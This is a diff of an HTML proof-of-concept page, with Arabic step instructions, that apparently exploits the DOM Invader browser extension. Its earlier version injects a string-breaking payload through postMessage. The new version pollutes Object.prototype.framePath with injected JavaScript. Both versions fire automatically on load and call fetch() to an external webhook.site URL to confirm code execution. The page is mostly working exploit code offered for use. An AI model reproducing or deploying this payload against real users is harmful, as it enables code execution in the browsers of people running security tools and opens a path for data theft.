@@ -1,41 +1,38 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>DOM Invader RCE Final</title>
+    <title>DOM Invader RCE - Final Boss</title>
     <style>
-        body { font-family: sans-serif; padding: 30px; background: #1a1a1a; color: #fff; }
-        .box { border: 2px solid #444; padding: 20px; border-radius: 10px; background: #222; }
-        .green-btn { padding: 15px 30px; background: #28a745; color: white; border: none; border-radius: 5px; cursor: pointer; }
+        body { font-family: sans-serif; padding: 30px; background: #111; color: #0f0; }
+        .container { border: 1px solid #0f0; padding: 20px; text-align: center; }
+        button { padding: 15px 30px; cursor: pointer; background: #0f0; color: #000; font-weight: bold; border: none; }
     </style>
 </head>
 <body>
-    <div class="box">
-        <h2>DOM Invader RCE Exploit</h2>
-        <p>1. افتح الـ DevTools وروح لـ DOM Invader -> Postmessage.</p>
-        <p>2. اضغط على الرسالة اللي هتظهر تحت عشان تفتح الـ Modal.</p>
-        <p>3. اضغط على زرار <strong>Send (CTRL+Enter)</strong> اللي تحت على اليمين.</p>
-        <p>4. شيك على الـ Webhook بتاعك.</p>
-        
-        <button class="green-btn" onclick="sendExploit()">إرسال الرسالة للأداة</button>
+    <div class="container">
+        <h1>DOM Invader RCE Exploit</h1>
+        <p>1. اضغط على الزرار تحت.</p>
+        <p>2. افتح DOM Invader -> Postmessage.</p>
+        <p>3. افتح الرسالة ودوس <strong>Send (CTRL+Enter)</strong>.</p>
+        <button onclick="triggerExploit()">إطلاق الـ Exploit</button>
     </div>
 
     <script>
-        function sendExploit() {
+        function triggerExploit() {
             const webhook = "https://webhook.site/d7b0c1e7-9c88-415f-bc83-f4b67cc847cd";
             
-            // Payload نظيف جداً عشان يكسر الـ String وينفذ الـ fetch
-            const payload = "'); fetch('" + webhook + "?rce=success'); //";
+            // 1. تلويث الـ Prototype عشان نحقن الكود في الـ framePath
+            // الكود ده هيتنفذ مباشرة بمجرد ما تضغط Send في الأداة
+            Object.prototype.framePath = "top; fetch('" + webhook + "?rce=PROTOTYPE_POLLUTION_SUCCESS'); //";
 
-            window.postMessage({
-                "source": "RCE",
-                "data": payload
-            }, "*");
-            
-            console.log("Payload sent to DOM Invader!");
+            // 2. إرسال رسالة عادية، الأداة هتسحب الـ framePath الملوث تلقائياً
+            window.postMessage({ "test": "exploit" }, "*");
+
+            console.log("Prototype polluted and message sent!");
         }
-        
-        // إرسال مرة واحدة عند التحميل
-        window.onload = sendExploit;
+
+        // تشغيل تلقائي
+        triggerExploit();
     </script>
 </body>
 </html>
